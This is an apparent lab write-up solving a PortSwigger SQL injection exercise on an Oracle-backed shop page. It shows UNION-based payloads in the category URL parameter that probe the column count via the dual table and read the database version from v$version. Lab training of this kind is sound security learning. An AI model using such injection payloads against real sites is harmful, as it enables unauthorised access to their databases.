<img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/9bfbc036-bbde-4877-8818-e17910dadba8" />Link: [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

# Overal view
The problem is a page displaying information of a clothes store with different categories as the below image

<img width="1920" height="958" alt="Screenshot From 2026-09-06 23-55-24" src="https://github.com/user-attachments/assets/6b101eef-d782-457b-943f-bd81fa5da3fc" />

So the goal is to make sure that the page displays the database version which could be this command from the cheatsheet
```
 SELECT banner FROM v$version
```

# How to solve
Look at the `hint` section, I know that:

```text
 On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
```

So I will use that default table to craft a payload to check for columns needed with the query of the URL. 
```
filter?category='UNION+SELECT+'abc','def'+FROM+dual--
```
<img width="1920" height="964" alt="Screenshot From 2026-09-07 00-10-34" src="https://github.com/user-attachments/assets/8b57f477-3e9e-4e27-bebc-3a2b992bc1e5" />

Then applying the command from the cheatsheet:
```
filter?category='UNION+SELECT+banner,'def'+FROM+v$version--
```

It workd. Happy Hacking!@#$!@$!@$@!$
